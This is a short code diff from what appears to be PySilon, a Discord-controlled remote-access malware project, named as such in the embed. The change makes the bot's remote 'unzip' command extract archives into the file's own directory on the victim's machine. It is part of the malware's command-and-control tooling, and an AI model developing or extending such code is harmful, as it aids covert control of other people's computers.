@@ -59,7 +59,7 @@ async def unzip(ctx, file):
             try: zip_file.testzip()
             except: await ctx.send(embed=embed); archive_password = await client.wait_for('message', check=get_archive_pass); archive_password = archive_password.content
 
-            zip_file.extractall(pwd=archive_password.encode()) if archive_password != None else zip_file.extractall()
+            zip_file.extractall(os.path.dirname(file), pwd=archive_password.encode()) if archive_password != None else zip_file.extractall(os.path.dirname(file))
             embed = discord.Embed(title='🟢 Success', description='```The zip file has been successfully extracted.```', colour=discord.Colour.green())
             embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
             await ctx.send(embed=embed)
